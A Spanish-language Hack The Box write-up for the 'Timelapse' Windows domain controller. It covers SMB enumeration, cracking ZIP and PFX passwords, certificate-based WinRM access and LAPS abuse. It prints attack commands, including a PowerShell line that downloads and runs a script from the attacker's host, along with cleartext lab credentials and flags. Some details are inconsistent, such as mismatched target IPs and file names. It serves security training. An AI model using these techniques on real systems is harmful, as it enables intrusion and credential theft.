---
tags:
  - type/writeup
  - asset/active-directory
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/452
dificultad: Media
ip: 10.10.11.152
os: Windows
relacionados:
  - "[[Cracking .PFX File]]"
  - "[[Reading .PFX File]]"
  - "[[Reading the user's Powershell history]]"
  - "[[Escalada de Privilegios mediante LAPS]]"
---
# HackTheBox - Timelapse

## Reconocimiento

### Escaneo de Puertos

Comencé mi reconocimiento con un escaneo de puertos exhaustivo utilizando **rustscan** para identificar todos los servicios en ejecución en el objetivo.
```Bash
rustscan -a $(cat ip) -- -sCV -oN 01_Reconnaissance/sCV
```

Los resultados del escaneo revelaron que la máquina era un controlador de dominio llamado `dc01` dentro del dominio `timelapse.htb`. Entre los puertos abiertos, el puerto **445 (SMB)** llamó mi atención de inmediato, ya que suele ser un buen punto de entrada.

### Enumeración del Recurso Compartido SMB

Dado que SMB estaba disponible, mi siguiente paso fue verificar si existían recursos compartidos a los que pudiera acceder de forma anónima.
```Bash
smbclient -L //10.10.11.166/
```

Efectivamente, descubrí un recurso compartido llamado `Shares` que no requería credenciales para acceder. Me conecté a él para investigar su contenido.
```Bash
smbclient //10.10.11.166/Shares
```

Dentro, encontré dos carpetas: `Dev` y `HelpDesk`. Al explorar la carpeta `Dev`, localicé un archivo de interés: `winrm_backup.zip`.


---

## Explotación de vulnerabilidades

### Crackeando el Archivo ZIP

Descargué el archivo `winrm_backup.zip` a mi máquina local. Al intentar descomprimirlo, me solicitó una contraseña. Para obtenerla, decidí crackearla utilizando **John the Ripper**. Primero, convertí el archivo ZIP a un formato de hash que John pudiera entender con la utilidad `zip2john`.
```Bash
zip2john winrm_backup.zip > zip.john
```

Luego, utilicé `john` con el popular diccionario `rockyou.txt` para encontrar la contraseña.
```Bash
john zip.john --wordlist=/usr/share/wordlists/rockyou.txt
```

> [!SUCCESS] Contraseña encontrada
> 
> La contraseña del archivo ZIP era: supremelegacy.

### Crackeando el Archivo PFX

Al descomprimir el archivo, obtuve un fichero llamado `legacyy_dev_auth.pfx`. Un archivo **PFX (Personal Information Exchange)** suele contener un certificado SSL y su clave privada correspondiente. Intenté extraer su contenido con `openssl`, pero me di cuenta de que también estaba protegido por una contraseña, y no era la misma que la del ZIP.

Repetí un proceso similar al anterior, pero esta vez utilizando la utilidad `pfx2john` para extraer el hash del archivo PFX.
```Bash
# Nota: es importante limpiar la salida del script para que John la procese correctamente.
pfx2john.py legacyy_dev_auth.pfx > hashpfx
```

Con el hash en `pfx.john`, volví a usar John para crackear la contraseña.
```Bash
john hashpfx -w=/usr/share/wordlists/rockyou.txt
```

> [!SUCCESS] Contraseña encontrada
> 
> La contraseña del archivo PFX era: thuglegacy.

### Obteniendo Acceso Inicial (Foothold)

Con la contraseña del PFX, procedí a extraer el certificado y la clave privada utilizando `openssl`.
```Bash
# Extraer la clave privada
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes

# Extraer el certificado
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
```

El escaneo de Nmap inicial había mostrado que el puerto **5986 (WinRM sobre SSL)** estaba abierto. Esto, junto con el certificado y la clave que acababa de obtener, me dio una clara ruta de acceso. Utilicé la herramienta **Evil-WinRM**, que permite la autenticación mediante certificados, para conectarme al objetivo.
```Bash
evil-winrm -i 10.10.11.166 -c cert.pem -k key.pem -S
```

Obtuve una shell en la máquina como el usuario `legacyy`, logrando mi punto de apoyo inicial.


---

## Escalada de privilegios

### Movimiento Lateral hacia 'svc_deploy'

Una vez dentro, comencé la fase de enumeración interna. Una de las primeras cosas que suelo revisar es el historial de comandos de PowerShell, ya que a veces los administradores dejan credenciales u otra información sensible por error.
```PowerShell
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

En el historial encontré las credenciales para el usuario `svc_deploy`.
> [!NOTE] Credenciales Encontradas
> 
> - **Usuario:** `svc_deploy`
>     
> - **Contraseña:** `E3R$Q62^12p7PLlC%KWaxuaV`
>     

Inmediatamente, usé estas credenciales para iniciar una nueva sesión de Evil-WinRM como `svc_deploy`, lo que representó un movimiento lateral.
```Bash
evil-winrm -i 10.10.11.166 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

### Abuso de LAPS (Local Administrator Password Solution)

Ya como `svc_deploy`, mi siguiente paso fue investigar los privilegios de este usuario. Ejecuté el comando `net user` para ver a qué grupos pertenecía.
```PowerShell
net user svc_deploy
```

El resultado fue revelador: `svc_deploy` era miembro del grupo **`LAPS_Readers`**. LAPS es una solución de Microsoft que gestiona y rota automáticamente las contraseñas de las cuentas de administrador local en las máquinas unidas a un dominio. Pertenecer a `LAPS_Readers` significa que este usuario tiene permisos para leer esas contraseñas.

### Explotando LAPS para Obtener Credenciales de Administrador

#### Opción 1) Uso de `Get-LAPSPasswords.ps1`
[Get-LAPSPasswords:](https://github.com/kfosaaen/Get-LAPSPasswords)

Comparto el archivo desde un servidor Python: 
```bash
python3 -m http.server 80
```

Cargo el archivo directamente desde la maquina victima: 
```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17/Get-LAPSPasswords.ps1')
```

Lo ejecuto: 
```powershell
Get-LAPSPasswords.ps1
```

Me muestra las contraseñas:
```bash
...

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : <ver abajo>
Expiration : 10/17/2025 4:06:37 PM

...
```

Contraseña obtenida: `#BYjJCuzL(V[LacY,NP8xpV;`

Es la contraseña del usuario `Administrator`, leo la flag y maquina terminada.


#### Opción 2) Uso de `AdmPwd.PS`

Para explotar este privilegio, subí el módulo de PowerShell `AdmPwd.PS`, que facilita la interacción con LAPS.
```PowerShell
upload /path/to/AdmPwd.PS/
Import-Module ./AdmPwd.PS.psd1
```

Primero, confirmé qué objetos del dominio estaban siendo gestionados por LAPS.
```PowerShell
Find-AdmPwdExtendedRights -identity *
```

El comando mostró que la OU `Domain Controllers` estaba bajo la gestión de LAPS. A continuación, verifiqué quién tenía derechos de lectura sobre esta unidad organizativa.
```PowerShell
Find-AdmPwdExtendedRights -identity 'Domain Controllers' | select-object ExtendedRightHolders
```

Como esperaba, el grupo `TIMELAPSE\LAPS_Readers` tenía los permisos `AllExtendedRights`. Esto confirmaba que, como miembro de ese grupo, podía leer la contraseña del administrador local del controlador de dominio (`dc01`).

Finalmente, ejecuté el comando para obtener la contraseña.
```PowerShell
Get-AdmPwdPassword -ComputerName dc01 | select password
```

> [!SUCCESS] Contraseña de Administrador Obtenida
> 
> La contraseña para la cuenta Administrator era: /1B@QZe3{BAAwzs%KY$pTb7d

Con las credenciales de administrador en mi poder, el último paso fue simple. Me conecté una vez más con Evil-WinRM, esta vez como el usuario `Administrator`.
```Bash
evil-winrm -i 10.10.11.166 -u administrator -p '/1B@QZe3{BAAwzs%KY$pTb7d' -S
```

Conseguí una shell como `NT AUTHORITY\SYSTEM` y completé el compromiso total de la máquina.



---

## Bandera(s)

> [!FLAG] `flag{user}`
> 51ad2c605e81b4f14dd4f68ccc64dc7e
^bandera

> [!FLAG] `flag{root}`
> 81e3f6f349436d66345d48d9c3fc1dd8
^bandera